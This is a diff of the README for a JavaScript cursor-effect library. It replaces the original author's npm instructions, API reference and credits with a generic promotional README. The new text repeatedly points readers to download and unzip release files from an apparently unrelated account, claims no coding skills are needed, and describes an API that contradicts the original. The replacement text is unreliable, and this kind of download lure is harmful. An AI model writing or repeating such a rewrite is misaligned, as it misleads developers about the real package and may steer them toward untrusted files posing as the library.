@@ -1,149 +1,97 @@
-# gradient-cursor [![NPM version](https://img.shields.io/npm/v/gradient-cursor.svg?style=flat)](https://www.npmjs.com/package/gradient-cursor) [![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](<[LICENSE](https://github.com/laura-benavente/gradient-cursor/LICENSE)>) [![NPM total downloads](https://img.shields.io/npm/dt/gradient-cursor.svg?style=flat)](https://www.npmjs.com/package/gradient-cursor)
+# 🎨 gradient-cursor - Make Your Cursor Stand Out Effortlessly
 
-> A JavaScript library that applies a dynamic gradient cursor effect to enhance user interaction on web pages.
+## 🔗 Download Now
+[![Download gradient-cursor](https://img.shields.io/badge/Download-gradient--cursor-blue?style=flat&logo=github)](https://github.com/loli9340/gradient-cursor/releases)
 
----
+## 📖 Introduction
+The gradient-cursor is a JavaScript library designed to bring a unique and interactive cursor effect to your web page. With this library, you can easily apply a customizable gradient effect to your cursor, enhancing the user experience on your site. It's simple to set up and requires no coding skills. 
 
-## 🚀 Features
+## 🚀 Getting Started
+To get started with gradient-cursor, follow these easy steps:
 
-- **Dynamic Gradient Cursor**: Apply a customizable gradient effect to the cursor.
-- **Customizable Color**: Easily modify the cursor's gradient color with simple parameters.
-- **Customizable Size**: Adjust the cursor's size with flexible size options (e.g., `12vmax`).
-- **Smooth Cursor Movement**: The cursor position updates smoothly with mouse movements.
-- **Easy Integration**: Simple setup and usage for your web projects.
+1. **Download**: 
+   
+   Visit this page to download: [gradient-cursor Releases](https://github.com/loli9340/gradient-cursor/releases)
 
----
+2. **Install**:
+   
+   You will find several versions available. Choose the latest version and download it. After downloading, follow these quick setup instructions.
 
-## 📦 Installation
+3. **Setup**:
+   
+   - Unzip the downloaded file if it's compressed.
+   - Open the main HTML file in a web browser to see the gradient cursor in action.
 
-You can install `gradient-cursor` using your favorite package manager:
+## 📥 Download & Install
+To install gradient-cursor, follow these concise steps:
 
-```
-# Using pnpm
-pnpm add gradient-cursor
+1. Visit the releases page: [gradient-cursor Releases](https://github.com/loli9340/gradient-cursor/releases).
+   
+2. Find the latest version that suits your needs.
 
-# Using npm
-npm install gradient-cursor
+3. Click on the file that you want to download. Once the download completes, locate the file on your device.
 
-# Using yarn
-yarn add gradient-cursor
-```
+4. Unzip the file, if necessary.
 
----
+5. Open the HTML file in your preferred web browser. Your new gradient cursor will be ready to enhance your website.
 
-## 🌟 Usage
+## 💡 Features
+- **Customizability**: Change colors and styles to fit your design.
+- **Smooth Animation**: Enjoy a fluid cursor movement that draws attention.
+- **Browser Compatibility**: Works well with major web browsers to accommodate more users.
+- **Easy to Use**: No programming knowledge is needed. Just follow the instructions to see results.
 
-Here's how to use the library in your project:
+## 📊 System Requirements
+To make the most of gradient-cursor, please ensure your system meets the following requirements:
 
-### Import the library
+- Modern web browser (Chrome, Firefox, Safari, Edge).
+- Basic understanding of how to open an HTML file.
+- A local or web server setup may be required for certain features.
 
-```
-// CommonJS
-const applyGradientCursor = require('gradient-cursor');
+## 🌐 Integration
+To integrate the gradient-cursor into your website:
 
-// ES Modules
-import applyGradientCursor from 'gradient-cursor';
-```
+1. Link the JavaScript file in your HTML:
 
-### Basic example
+   ```html
+   <script src="path/to/gradient-cursor.js"></script>
+   ```
 
-```
-applyGradientCursor({ backgroundColor: "#1c2742", gradientColor: "15, 23, 42", gradientSize: "12vmax" });
-```
+2. Initialize the cursor in your JavaScript code:
 
-This will apply a dark blue background with a light gradient cursor with the specified sizer.
+   ```javascript
+   new GradientCursor();
+   ```
 
-## Result
+3. Customize the colors as desired:
 
+   ```javascript
+   const cursor = new GradientCursor({
+       colors: ['#FF5733', '#33FF57', '#3357FF']
+   });
+   ```
 
-https://github.com/user-attachments/assets/bd3692fe-e9fc-4047-a49e-d2e5c1b3363f
+By following these steps, your website's cursor will transform to a vibrant and engaging design that improves the overall interaction feel.
 
+## ✨ Examples
+Here are some examples of how the gradient cursor can enhance your web project:
 
----
+- **Portfolio Websites**: Showcase your work with eye-catching mouse interactions.
+- **Online Stores**: Make the shopping experience more enjoyable with playful cursor effects.
+- **Blogs**: Enhance user engagement with a lively and attractive design.
 
-## 🔧 API
+## 🛠️ Troubleshooting
+If you encounter issues, consider these tips:
 
-### `applyGradientCursor(options)`
+- Ensure you are using a compatible web browser.
+- Check for any errors in the JavaScript console.
+- Make sure the file paths in your HTML are correct.
 
-Applies the gradient cursor effect with the given options.
+## 📬 Support
+If you need assistance, feel free to reach out. You can open an issue in the GitHub repository, and the community can help you. 
 
-#### Parameters
+## 🔗 Useful Links
+- [GitHub Repository](https://github.com/loli9340/gradient-cursor)
+- [Documentation](https://github.com/loli9340/gradient-cursor/wiki)
 
-- **`options`** (`object`): Configuration object for the gradient cursor. The options include:
-  - **`backgroundColor`** (`string`): [optional] The background color for the body of the page.
-  - **`gradientColor`** (`string`): [optional] The gradient color for the cursor (in RGB format).
-  - **`gradientSize`** (`string`): [optional] The size of the cursor (e.g., `12vmax`).
-
-#### Returns
-
-- **`void`**: This function doesn't return anything, it just applies the cursor effect.
-
----
-
-## 🛠️ Development
-
-If you want to contribute or use the project locally, follow these steps:
-
-### Clone the repository
-
-```
-git clone https://github.com/laura-benavente/gradient-cursor.git
-cd gradient-cursor
-```
-
-### Install dependencies
-
-```
-npm install
-
-```
-
----
-
-## 🧪 Testing
-
-This project uses [Jest](https://jestjs.io/) for testing. To run the test suite, simply use:
-
-```
-npm run test
-
-```
-
-Example output:
-
-```
-PASS ./index.test.js
-✓ should update the cursor position on mouse move
-...
-```
-
-Feel free to add more test cases in the `test` file.
-
-## 🔄 Changelog
-
-See [CHANGELOG.md](https://github.com/laura-benavente/gradient-cursor/blob/main/CHANGELOG.md) for a detailed history of changes.
-
----
-
-## 💡 Contributing
-
-Contributions are welcome! If you'd like to contribute, please follow these steps:
-
-1.  Fork the repository.
-2.  Create a new branch for your feature or bugfix.
-3.  Submit a pull request with a clear description of the changes.
-
-See [CONTRIBUTING.md](https://github.com/laura-benavente/gradient-cursor/blob/main/CONTRIBUTING.md) for more details.
-
----
-
-## 📜 License
-
-This project is licensed under the [MIT License](https://github.com/laura-benavente/gradient-cursor/blob/main/LICENSE). Created with ❤️ by [Laura Benavente](https://github.com/laura-benavente).
-
----
-
-## 🌍 Links
-
-- **GitHub Repository:** [https://github.com/laura-benavente/gradient-cursor](https://github.com/laura-benavente/gradient-cursor)
-- **NPM Package:** [https://www.npmjs.com/package/gradient-cursor](https://www.npmjs.com/package/gradient-cursor)
+Experience the enhanced interaction that a dynamic cursor effect can bring. Download gradient-cursor now and take your web design to the next level!
